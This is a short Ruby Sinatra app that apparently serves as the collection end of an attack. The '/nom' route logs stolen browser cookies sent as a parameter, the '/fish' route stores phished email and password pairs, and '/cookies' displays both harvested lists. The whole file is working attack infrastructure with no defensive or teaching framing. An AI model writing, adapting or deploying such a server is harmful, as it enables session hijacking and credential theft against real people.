require 'rubygems'
require 'sinatra'

get '/nom' do
  File.open('../cookies.txt', 'a') { |f|
    f.puts params['cookie']
  }
  ""
end

post '/fish' do
  File.open('../fish.txt', 'a') { |f|
    f.puts "#{params['email']},#{params['password']}"
  }
  ""
end

get '/cookies' do
  @passwords = []
  File.open('../fish.txt', 'r').each { |line|
    @passwords << line.split(",")
  }
  @cookies = []
  File.open('../cookies.txt', 'r').each { |line|
    @cookies << line
  }
  erb :cookies
end